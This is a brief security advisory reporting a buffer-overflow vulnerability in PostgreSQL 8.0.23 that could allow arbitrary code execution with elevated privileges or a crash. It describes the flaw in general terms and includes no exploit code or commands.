PostgreSQL is prone to a buffer-overflow vulnerability because the application fails to perform adequate boundary checks on user-supplied data.

Attackers can exploit this issue to execute arbitrary code with elevated privileges or crash the affected application.

PostgreSQL 8.0.23 is vulnerable; other versions may also be affected.
